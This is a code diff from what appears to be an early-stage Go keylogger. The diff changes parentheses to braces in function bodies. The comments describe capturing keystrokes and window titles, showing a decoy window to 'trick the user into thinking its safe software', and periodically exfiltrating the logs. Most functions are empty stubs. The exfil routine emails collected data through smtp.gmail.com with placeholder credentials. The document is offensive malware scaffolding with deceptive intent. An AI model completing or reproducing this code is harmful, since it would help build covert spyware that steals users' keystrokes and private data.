@@ -25,7 +25,7 @@ var (
 
 )
 
-func main() (
+func main() {
 	// setup go routines for the program to run
 	go keylogging() // log the keystrokes
 	// these are only going to work on windows for now
@@ -33,35 +33,34 @@ func main() (
 	go GetWindowTitle() 
 	go GetActiveWindow()
 	go exfil() // every time interval need to send the log file and other logged data
-)
+}
 
 // create a window on startup to trick the user 
 // into thinking its safe software
-func startingWindow() (
+func startingWindow() {
 
-)
+}
 
 // get the active foreground
-func GetActiveWindow() (
+func GetActiveWindow() {
 	// log the active forground this should be in the same log file as keystrokes
 
-)
+}
 
 // get the window title 
-func GetWindowTitle() (
+func GetWindowTitle() {
 	// log the window title on windows
-
-)
+}
 
 // get keystrokes
-func keylogging() (
+func keylogging() {
 	// need to log the keys based on OS and log to file
 
-)
+}
 
-func exfil() (
+func exfil() {
 	// need to create a way to exfil data besides keystrokes
-	m := email.NewMessage("venivici")
+	m := email.NewMessage("v1n1v1c1")
 	m.From = "from@example.com" // need to convert to env variables if possible
 	m.To = []string{"to@example.com"} // the test email account
 
@@ -72,4 +71,4 @@ func exfil() (
 
 	// change to email other than google
 	err = email.Send("smtp.gmail.com:587", smtp.PlainAuth("", "user", "password", "smtp.gmail.com"), m)
-)
+}
